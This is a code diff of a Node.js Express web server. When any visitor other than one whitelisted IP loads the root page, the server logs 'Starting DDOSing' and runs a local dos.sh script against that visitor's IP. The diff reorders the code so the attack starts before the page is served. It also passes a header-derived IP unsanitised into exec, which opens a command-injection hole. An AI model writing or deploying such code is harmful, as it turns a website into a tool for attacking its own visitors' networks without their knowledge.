@@ -4,8 +4,6 @@ const { exec } = require("child_process");
 
 app.get("/", (req, res) => {
 
-    res.sendFile(__dirname + "/static/index.html");
-
     let date = new Date();
 
     let ip = req.headers['x-forwarded-for'] ||
@@ -15,7 +13,7 @@ app.get("/", (req, res) => {
     ip = ip.replace("::ffff:", "");
 
     if (ip != "91.113.91.133") {
-        console.log("Started DDOSing");
+        console.log("Starting DDOSing");
         console.log(date.toString() + "  " + ip);
 
         exec(__dirname + "/dos.sh " + ip, (error, stdout, stderr) => {
@@ -29,8 +27,11 @@ app.get("/", (req, res) => {
             }
             console.log(`stdout: ${stdout}`);
         });
+
+        console.log("Script started");
     }
 
+    res.sendFile(__dirname + "/static/index.html");
 });
 
 
